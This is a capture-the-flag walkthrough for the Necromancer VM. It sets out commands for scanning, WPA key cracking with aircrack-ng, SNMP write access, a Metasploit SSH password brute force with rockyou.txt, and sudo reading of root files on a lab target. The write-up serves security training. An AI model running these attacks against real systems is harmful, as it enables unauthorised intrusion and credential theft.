@@ -1,0 +1,229 @@
+
+								
+																		Hack the Necromancer VM (CTF Challenge)
+								
+								
+								
+								
+									
+										posted inCTF Challenges, Kali Linux, Penetration Testing									
+									
+									
+									on December 2, 2016
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									The Necromancer boot2root box was created for a recent SecTalks Brisbane CTF competition. There are 11 flags to collect on your way to solving the challenge. The end goal is simple…. Destroy the Necromancer!
+ You can download necromancer from here let’s get going. Firstly, we run netdiscover
+ Netdiscover
+
+Our next step is nmap.
+nmap -A -p- 192.168.0.110
+
+The scan takes a bit time and gives us nothing. So, let’s try a UDP scan using nmap.
+nmap -sU -T4 -p- 192.168.0.110
+
+We get a UDP port 666 open. Lets try netcat on it.
+ nc -nvu 192.168.0.110 666
+
+No matter how many times we hit enter, we get the same reply- “You gasp for air! Time is running out!”
+When we tried running the machine (necromancer), we had a message regarding the IP – “Renewal in 3600 seconds”. This seems to be related to the message on our terminal.
+Let’s quickly run tcpdump.
+ tcpdump host 192.168.0.110
+
+We get to know about some gateway 4444. This can be another port on our target. Lets use netcat once again.
+ nc -nvlp 4444
+
+And we get a text dump in return. It has capital characters, small characters and numbers as well. This has to be a base64 encoded text. We decode it at www.asciitohex.com and get some sensible text.
+
+Ok. We have our 1st flag. And a message to chant the flag’s string at UDP port 666. The flag1 text seems to be a md5 hash so we decrypt it at www.hashkiller.co.uk . It decrypts to “opensesame”. Let’s return to our port 666 using netcat and type in this string there.
+ nc -nvu 192.168.0.110
+opensesame
+
+Another hint. Numeral 80 reminds us ofport 80 used for http. Let’s fire up the victim machine’s IP to our browser on port 80.
+
+Nothing useful except an image. Let’s download it and try to analyse it using binwalk
+ binwalk /root/Desktop/pileoffeathers.jpg
+
+So we discover that the image is actually a zip archive. Let’s rename it.
+mv /root/Desktop/pileoffeathers.jpg /root/Desktop/pileoffeathers.zip
+
+Upon unzipping the file we get a txt file named feathers.txt which again contains a base64 text. We it and get our 3rd flag along with a clue /amagicbridgeappearsatthechasm. Seems like a directory decode.
+
+Opening the directory in our browser, we are greeted by another web-page with seriously no clues this time. It only tells us that we need a magical item that could protect us from the necromancer’s spell. We google for “magic items wiki” and find some good stuff on the very first link. But what next?
+
+We decide to make a custom dictionary with all the words on this wiki page. We will use cewl for this.
+cewlhttps://en.wikipedia.org/wiki/List_of_mythological_objects -d 0 -w /root/Desktop/magicItems.txt –v
+
+This makes a dictionary of magical items on our desktop. Let us try dirb to get our next clue.
+dirb http://192.168.0.110/amagicbridgeappearsatthechasm -w /root/Desktop/magicitems.txt
+
+We get another directory as” result. “talisman.
+
+When we visit the url now using talisman, we are asked to download a binary file named talisman.
+
+We download the file and change the permissions of talisman by running
+chmod 777 /root/Desktop/talisman
+ Thereafter we run the file by going to its location.
+./talisman
+
+No matter what we answer to the asked question –“Do you want to wear the talisman?”, the result is the same –“Nothing happens”. So lets try to debug the binary file.
+gdb /root/Desktop/talisman
+
+Get some info about the functions-
+info functions
+
+Create a break point at wearTalisman because after all we want to wear the talisman.
+break wearTalisman
+run
+
+And then jump to chantToBreakSpell
+ jump chantToBreakSpell
+Yess. We succeeded in wearing the talisman. We get our 4th flag and a hint to chant the flag’s words at UDP port 31337.
+
+ Now the words appear to be in md5 hash and upon decrypting it we get – “blackmagic” We now use netcat to connect to port 31337 and type in “blackmagic” there.
+ nc -unv 192.168.0.110 31337
+blackmagic
+And we get another directory along with our 5th flag
+
+We open the directory with our victim’s IP.
+
+Another webpage with a hint to see the UDP port 161(used for snmp) and a close look reveals that the word “necromancer” just before the image is actually a link. Upon clicking it we get another file to download named “necromancer”. We download and unzip it. It contains a cap file named necromancer. upon analyzing this file with wireshark, we discover that 802.11 protocol is being used. This indicates that the file is a wireless data cap file so let’s try to crack the key using aircrack-ng with rockyou.txt as our dictionary.
+ aircrack-ng /root/Desktop/necromancer.cap -w /usr/share/wordlists/rockyou.txt
+
+This cracks the key as death2all. use it with port 161 i.e. snmp.
+snmpwalk-c death2all -v 1 192.168.0.110
+
+It says that the door is locked.
+
+Let’s try to unlock it using snmpset.
+snmpset -c death2allrw -v 1 192.168.0.110 iso.3.6.1.2.1.1.6.0 s Unlocked
+When the string changes to “Unlocked”, we run our previous command once again
+ snmpwalk -c death2all -v 1 192.168.0.110
+
+Voila!! The door unlocks and we get another flag along with a clue i.e. TCP port 22 (used for ssh) . flag7{9e5494108d10bbd5f9e7ae52239546c4} – t22. Another md5 hash that decrypts to “demonslayer”.
+ We try to login to port 22 assuming “demonslayer” to be the password but fail.
+ssh 192.168.0.110
+demonslayer
+
+This means that “demonslayer” should be the username for ssh. To crack the password, we will use metasploit along with rockyou.txt dictionary. Open a terminal for metasploit.
+ Search ssh_login
+Thereafter we run the following commands:
+use auxiliary/scanner/ssh/ssh_login
+set rhosts 192.168.0.110
+set username demonslayer
+set pass_file /usr/share/wordlists/rockyou.txt
+run
+
+We get password as 12345678 and a shell as well.
+
+But neither ls nor dir seems to be working on this shell.
+
+So, we login to ssh via terminal on host using demonslayer/12345678
+ssh [email protected]
+12345678
+
+Using ls -la we discover that there lies a flag8.txt file in the directory. To read its contents we use
+cat flag8.txt
+
+We get another hint regarding udp port 777. This does not works on our pc. So let us try on the victim’s shell.
+nc -u localhost 777 
+and hit enter twice.
+
+ So the necromancer is now trying to play a game with us. upon googling for his question “Where do the Black Robes practice magic of the Greater Path?” We get the answer. its Kelewan.
+
+Our 8th flag is here.flag8{55a6af2ca3fee9f2fef81d20743bda2c} and another question as well that asks, “Who did Johann Faust VIII make a deal with?” Google tells us the answer to this question is Mephistopheles.
+
+flag9{713587e17e796209d1df4c9c2c2d2966}
+ And we get the next flag and yet another question “Who is tricked into passing the Ninth Gate?” Google comes in handy again and tells us the answer once more. The next answer is Hedge.
+
+And our next flag awaits us. flag10{8dc6486d2c63cafcdc6efbba2be98ee4} nothing more to be noticed here. But if I am not wrong, we did see this “small vile” thing somewhere earlier. Let’s head back by cntrl+c and try to look for it.
+ We type in ls -la and yes it’s there “.smallvile” about which we just discovered in the description alongwith our 10th flag. Let’s open it using cat.
+ cat .smallvile
+
+Hope this opened up some gates cause we don’t see any clue here. Let’s try sudo.
+sudo –l
+
+Seems to be working. It shows us the location of our 11th flag and that the flag11.txt file is not protected by any sort of password. Let’s try to open it.
+sudo /bin/cat /root/flag11.txt
+
+Wohoo!! Mission Accomplished. The last flag has been captured.
+
+Researcher and Author:Jitesh Khanna is a passionate Researcher and Technical Writer at Hacking Articles. He is a hacking enthusiast. contact here.
+ 
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
